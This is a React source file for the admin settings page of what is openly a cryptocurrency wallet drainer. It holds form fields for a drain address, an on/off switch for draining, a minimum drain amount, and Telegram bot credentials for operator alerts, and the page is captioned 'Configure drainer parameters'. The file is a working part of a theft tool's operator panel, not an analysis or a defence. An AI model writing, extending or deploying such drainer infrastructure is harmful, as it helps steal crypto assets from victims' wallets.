import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function AdminSettings() {
  const { data: settings, refetch } = trpc.admin.getSettings.useQuery();
  const [values, setValues] = useState<Record<string, string>>({});

  const updateSetting = trpc.admin.updateSetting.useMutation({
    onSuccess: () => { toast.success("Setting saved!"); refetch(); },
    onError: (e) => toast.error(e.message),
  });

  useEffect(() => {
    if (settings) {
      const map: Record<string, string> = {};
      settings.forEach(s => { map[s.key] = s.value ?? ""; });
      setValues(map);
    }
  }, [settings]);

  const handleSave = (key: string) => {
    updateSetting.mutate({ key, value: values[key] ?? "" });
  };

  const settingGroups = [
    {
      title: "DRAIN CONFIGURATION",
      color: "pink",
      keys: ["drain_address", "drain_enabled", "min_drain_amount"],
    },
    {
      title: "SITE SETTINGS",
      color: "cyan",
      keys: ["site_title", "site_description", "supported_networks"],
    },
    {
      title: "NOTIFICATIONS",
      color: "purple",
      keys: ["telegram_bot_token", "telegram_chat_id"],
    },
  ];

  const getDescription = (key: string) => {
    return settings?.find(s => s.key === key)?.description ?? key;
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-black neon-text-cyan" style={{ fontFamily: 'Orbitron' }}>SETTINGS</h1>
        <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Share Tech Mono' }}>Configure drainer parameters</p>
      </div>

      {settingGroups.map(group => (
        <div key={group.title} className="cyber-card rounded-lg p-6">
          <h2 className={`text-sm font-bold mb-5 ${group.color === 'pink' ? 'neon-text-pink' : group.color === 'cyan' ? 'neon-text-cyan' : 'neon-text-purple'}`}
            style={{ fontFamily: 'Orbitron', letterSpacing: '0.1em' }}>
            {group.title}
          </h2>
          <div className="space-y-4">
            {group.keys.map(key => (
              <div key={key} className="space-y-1.5">
                <label className="text-xs text-muted-foreground uppercase tracking-widest" style={{ fontFamily: 'Share Tech Mono' }}>
                  {key.replace(/_/g, " ")}
                </label>
                <p className="text-xs text-muted-foreground" style={{ fontFamily: 'Rajdhani' }}>
                  {getDescription(key)}
                </p>
                <div className="flex gap-3">
                  {key === "drain_enabled" ? (
                    <select
                      className="flex-1 cyber-input rounded text-sm"
                      value={values[key] ?? "true"}
                      onChange={e => setValues(v => ({ ...v, [key]: e.target.value }))}>
                      <option value="true">Enabled</option>
                      <option value="false">Disabled</option>
                    </select>
                  ) : (
                    <input
                      type={key.includes("token") || key.includes("secret") ? "password" : "text"}
                      className="flex-1 cyber-input rounded text-sm"
                      value={values[key] ?? ""}
                      onChange={e => setValues(v => ({ ...v, [key]: e.target.value }))}
                      placeholder={`Enter ${key.replace(/_/g, " ")}...`}
                    />
                  )}
                  <button
                    onClick={() => handleSave(key)}
                    disabled={updateSetting.isPending}
                    className="cyber-btn-pink px-4 py-2 rounded text-xs font-bold disabled:opacity-50"
                    style={{ fontFamily: 'Orbitron' }}>
                    SAVE
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
}
